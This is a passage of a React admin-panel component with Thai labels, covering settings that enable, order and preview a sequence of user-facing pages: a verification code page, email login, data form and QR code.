                            <p className="text-sm text-gray-600">แสดง QR Code สำหรับสแกน</p>
                          </div>
                          <label className="relative inline-flex items-center cursor-pointer">
                            <input 
                              type="checkbox" 
                              className="sr-only peer" 
                              defaultChecked={true}
                              onChange={(e) => updatePageSetting('showQRPage', e.target.checked)}
                            />
                            <div className="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                          </label>
                        </div>
                      </CardContent>
                    </Card>
                  </div>
                </div>

                {/* ลำดับการแสดงหน้า */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ลำดับการแสดงหน้า</h3>
                  <p className="text-sm text-gray-600">ลากเพื่อเปลี่ยนลำดับการแสดงหน้า</p>
                  
                  <div className="space-y-2">
                    <div className="flex items-center p-3 bg-gray-50 rounded-lg border-2 border-dashed border-gray-300">
                      <div className="flex items-center space-x-3">
                        <div className="w-6 h-6 bg-blue-500 text-white rounded flex items-center justify-center text-sm font-bold">1</div>
                        <span className="font-medium">หน้ารหัสยืนยันตัวตน</span>
                      </div>
                      <div className="ml-auto text-gray-400">⋮⋮</div>
                    </div>
                    
                    <div className="flex items-center p-3 bg-gray-50 rounded-lg border-2 border-dashed border-gray-300">
                      <div className="flex items-center space-x-3">
                        <div className="w-6 h-6 bg-green-500 text-white rounded flex items-center justify-center text-sm font-bold">2</div>
                        <span className="font-medium">หน้าล็อกอินด้วยอีเมล</span>
                      </div>
                      <div className="ml-auto text-gray-400">⋮⋮</div>
                    </div>
                    
                    <div className="flex items-center p-3 bg-gray-50 rounded-lg border-2 border-dashed border-gray-300">
                      <div className="flex items-center space-x-3">
                        <div className="w-6 h-6 bg-purple-500 text-white rounded flex items-center justify-center text-sm font-bold">3</div>
                        <span className="font-medium">หน้าฟอร์มข้อมูล</span>
                      </div>
                      <div className="ml-auto text-gray-400">⋮⋮</div>
                    </div>
                    
                    <div className="flex items-center p-3 bg-gray-50 rounded-lg border-2 border-dashed border-gray-300">
                      <div className="flex items-center space-x-3">
                        <div className="w-6 h-6 bg-red-500 text-white rounded flex items-center justify-center text-sm font-bold">4</div>
                        <span className="font-medium">หน้า QR Code</span>
                      </div>
                      <div className="ml-auto text-gray-400">⋮⋮</div>
                    </div>
                  </div>
                </div>

                {/* ตัวอย่างการทำงาน */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">ตัวอย่างการทำงาน</h3>
                  <Card>
                    <CardContent className="p-4">
                      <div className="text-sm text-gray-600 space-y-2">
                        <p><strong>หน้าที่เปิดใช้งาน:</strong> หน้ารหัสยืนยัน → หน้าอีเมล → หน้าฟอร์ม → หน้า QR</p>
                        <p><strong>การทำงาน:</strong> ผู้ใช้จะเห็นหน้าตามลำดับที่กำหนด หากปิดหน้าใดหน้าหนึ่ง ระบบจะข้ามไปหน้าถัดไป</p>
                        <p><strong>ตัวอย่าง:</strong> หากปิดหน้าอีเมล ผู้ใช้จะไปจากหน้ารหัสยืนยันตรงไปหน้าฟอร์มทันที</p>
                      </div>
                    </CardContent>
                  </Card>
                </div>

                {/* ปุ่มบันทึก */}
                <div className="flex space-x-2">
                  <Button 
                    onClick={savePageSettings}
                    className="bg-blue-500 hover:bg-blue-600 text-white"
                  >
                    บันทึกการตั้งค่า
                  </Button>
                  <Button 
                    variant="outline"
                    onClick={() => window.open('/', '_blank')}
                  >
                    ดูตัวอย่าง
                  </Button>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}

export default AdminPanel

